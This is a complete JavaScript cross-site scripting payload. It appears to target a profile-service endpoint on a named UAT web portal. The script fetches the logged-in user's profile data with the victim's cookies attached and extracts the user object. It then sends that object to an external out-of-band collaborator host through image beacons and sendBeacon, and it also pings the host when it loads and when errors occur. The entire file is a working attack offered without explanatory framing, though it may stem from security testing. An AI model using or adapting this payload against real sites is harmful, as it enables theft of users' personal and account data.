// XSS Payload - Extract only user object from initNewPortalData
(function() {
  console.log('[PAYLOAD STARTED]');
  
  const attackerServer = 'https://nh8d7wmgsxld6hcm5ub72ejt0k6bu6iv.oastify.com';
  
  // Ping to verify payload loads
  (new Image()).src = attackerServer + '/ping?status=loaded';
  
  function callEndpoint() {
    console.log('[CALLING ENDPOINT]');
    
    fetch('https://uat.citivelocity.com/portal-profile-service/initNewPortalData', {
      method: 'GET',
      credentials: 'include',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      }
    })
    .then(response => response.json())
    .then(data => {
      console.log('[DATA RECEIVED]', data);
      
      // Extract ONLY the user object
      const userObject = data.user;
      
      if (userObject) {
        console.log('[USER OBJECT EXTRACTED]', userObject);
        window.capturedUserData = userObject;
        
        // Send via image beacon (works with URL encoding)
        const beacon = new Image();
        beacon.src = attackerServer + '/exfil?user=' + encodeURIComponent(JSON.stringify(userObject));
        console.log('[SENT VIA IMAGE BEACON]');
        
        // Also try sendBeacon for reliability
        if (navigator.sendBeacon) {
          navigator.sendBeacon(
            attackerServer + '/user',
            JSON.stringify(userObject)
          );
          console.log('[SENT VIA SENDBEACON]');
        }
      }
    })
    .catch(err => {
      console.log('[ERROR]', err);
      (new Image()).src = attackerServer + '/error?msg=' + encodeURIComponent(err.message);
    });
  }
  
  // Call immediately and on delays
  callEndpoint();
  setTimeout(callEndpoint, 500);
  setTimeout(callEndpoint, 1500);
  
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', callEndpoint);
  } else {
    window.addEventListener('load', callEndpoint);
  }
  
  console.log('[PAYLOAD READY]');
  
})();
